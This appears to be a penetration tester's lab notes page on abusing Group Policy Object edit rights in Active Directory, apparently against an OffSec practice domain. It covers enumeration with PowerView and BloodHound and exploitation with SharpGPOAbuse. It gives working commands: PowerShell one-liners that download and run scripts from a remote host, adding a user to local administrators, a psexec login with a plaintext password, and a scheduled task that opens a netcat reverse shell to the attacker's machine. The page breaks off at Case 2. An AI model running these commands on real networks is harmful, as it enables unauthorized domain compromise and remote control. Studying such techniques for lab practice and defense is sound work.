# GPO modification attack

## Assumptions

* GPO exists. by Default, Default Domain Policy exits.&#x20;
* GPO ADMIN (group or account) has GenericAll privilege to the GPO.&#x20;
* A compromised account is a member of GPO ADMIN group or has GenericAll or WriteDACL privileges to the GPO Admin account.
* If with Write DACL, update the privilege to Generic All.&#x20;

## Case 1&#x20;

### Enumeration

Here is a vulnerable bloodhound result. A user is a member of GPO Admins group that has GenericWrite as well as WriteDacl and WriteOwner permissions to the GPO. You can edit the GPO.&#x20;

The example below shows the 'Support' account is a member of GPO Admins. In this case, you can use current 'Support' account and its credential to use SharpGPOAbuse.exe to escalate the privilege to the Administrator Groups - by adding the account to the local Administrators group or by sending a reverse shell request back to Kali with Administrator privilege.&#x20;

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
# Import the modules 
PS> iex (new-Object Net.WebClient).DownloadString('http://192.168.45.205/privesc/PowerView.ps1')|Import-Module PowerView.ps1
PS> iex (new-Object Net.WebClient).DownloadString('http://192.168.45.205/privesc/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# Check the user's permissions. 
PS> Get-NetGPO
PS> Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh
```
{% endcode %}

### Exploitation

SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO. Reference:  [https://github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)\
\
Pre-complied executable: \
[https://github.com/Flangvik/SharpCollection/raw/master/NetFramework\_4.0\_x64/SharpGPOAbuse.exe ](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe)\
\
There are two options at least to escalate the privilege.&#x20;

#### **1. Add a user to the Local Administrator and run** psexec **(requires the user's password)**

{% code overflow="wrap" %}
```bash
PS> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
PS> gpupdate /force
PS> net grouop anirudh /domain

Kali> psexec.py vault.offsec/anirudh:SecureHM@192.168.51.172
```
{% endcode %}

#### **2. Create a task that runs netcat or powershell reverse shell back to Kali**

{% code overflow="wrap" %}
```bash
Kali> rlwrap nc -nlvp 53

PS> \SharpGPOAbuse.exe --AddComputerTask --TaskName "test" --Author "Administrator" --Command "cmd.exe" --Arguments "/c C:\Users\support\Documents\nc.exe 192.168.45.205 53 -e cmd.exe" --GPOName "Default Domain Policy"
PS> gpupdate /force
```
{% endcode %}

## Case 2

### Enumeration

This example shoes Amelia.Griffiths is a member of Legacy Group, which has a WriteDACL to GPOADM account, which means that Amelia.Griffiths can change the password of GPOADM account. With the GPO ADM account and its new credential, you can run pyGPOAbuse.py to escalate the privilege to the Administrators group by creating a task to add the account to the local Administrators group. Or you can create a shadow account for GPO Admin account instead of having a new credential. With the shadow account, you can run pyGPOAbuse.py to do the same.&#x20;

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
